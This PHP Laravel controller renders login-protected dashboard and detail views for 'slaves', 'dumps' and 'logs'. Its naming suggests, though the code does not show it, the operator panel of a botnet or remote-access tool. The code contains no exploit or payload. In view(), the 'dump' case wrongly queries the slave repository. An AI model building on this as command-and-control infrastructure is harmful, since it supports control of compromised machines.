<?php

namespace App\Http\Controllers;

use App\Log;
use App\Dump;
use App\Slave;
use Illuminate\Http\Request;
use App\Repositories\LogRepository as Logs;
use App\Repositories\DumpRepository as Dumps;
use App\Repositories\SlaveRepository as Slaves;

class CommandController extends Controller {

    private $logs;
    private $dumps;
    private $slaves;

    public function __construct(Slaves $slaves, Dumps $dumps, Logs $logs)
    {
        $this->middleware('auth');
        $this->slaves = $slaves;
        $this->dumps = $dumps;
        $this->logs = $logs;
    }

    public function dashboard()
    {
        return view('command.dashboard', [
            'slaves' => $this->slaves->all(),
            'dumps' => $this->dumps->all(),
            'logs' => $this->logs->all()
        ]);
    }

    public function slaves()
    {
        return view('command.slaves', ['slaves' => $this->slaves->all()]);
    }

    public function slave($id)
    {
        $slave = Slave::find($id);
        if(!$slave) return redirect()->back();
        return view('command.slave', ['slave' => $slave]);
    }

    public function slaveLogs($id)
    {
        $slave = $this->slaves->find($id);
        if(!$slave) return redirect()->back();
        return view('command.slave-logs', ['slave' => $slave]);
    }

    public function slaveDumps($id)
    {
        $slave = $this->slaves->find($id);
        if(!$slave) return redirect()->back();
        return view('command.slave-dumps', ['slave' => $slave]);
    }

    public function dumps()
    {
        return view('command.dumps', ['dumps' => $this->dumps->all()]);
    }

    public function dump($id)
    {
        $dump = $this->dumps->find($id);
        if(!$dump) return redirect()->back();
        return view('command.dump', ['dump' => $dump]);
    }

    public function logs()
    {
        return view('command.logs', ['logs' => $this->logs->all()]);
    }

    public function log($id)
    {
        $log = $this->logs->find($id);
        if(!$log) return redirect()->back();
        return view('command.log', ['log' => $log]);
    }

    public function view($what, $id)
    {
        $possibilities = ["slave", "dump", "log"];
        if(!in_array($what, $possibilities)) return redirect()->route('command.dashboard');
        switch($what){
            case "slave":
                $entry = $this->slaves->find($id);
            break;
            case "dump":
                $entry = $this->slaves->find($id);
            break;
            case "log":
                $entry = $this->logs->find($id);
            break;
        }
        return view('command.pre-view', ['what' => $what, 'entry' => $entry]);
    }

}
